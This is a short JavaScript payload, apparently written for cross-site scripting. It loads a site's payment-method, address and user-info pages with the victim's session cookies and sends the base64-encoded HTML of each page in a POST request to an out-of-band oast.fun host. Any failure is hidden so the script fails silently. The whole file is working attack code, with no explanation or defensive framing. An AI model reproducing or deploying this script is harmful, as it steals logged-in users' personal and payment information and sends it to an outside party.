(async () => {
  const exfilEndpoint = "http://d0li5rpon5bt0r3fmp6gukygsu7n3fej6.oast.fun/";
  const targets = [
    "/Pages/Subscriptions/ProfileManagement.aspx?view=PaymentMethods",
    "/Pages/Subscriptions/ProfileManagement.aspx?view=Address",
    "/user/userinfo/"
  ];

  for (const path of targets) {
    try {
      const res = await fetch(path, { credentials: "include" });
      const html = await res.text();

      const imgData = `data:text/html;base64,${btoa(html)}`;

      await fetch(exfilEndpoint, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          url: location.origin + path,
          image: imgData
        })
      });
    } catch (err) {
      // Fail silently
    }
  }
})();
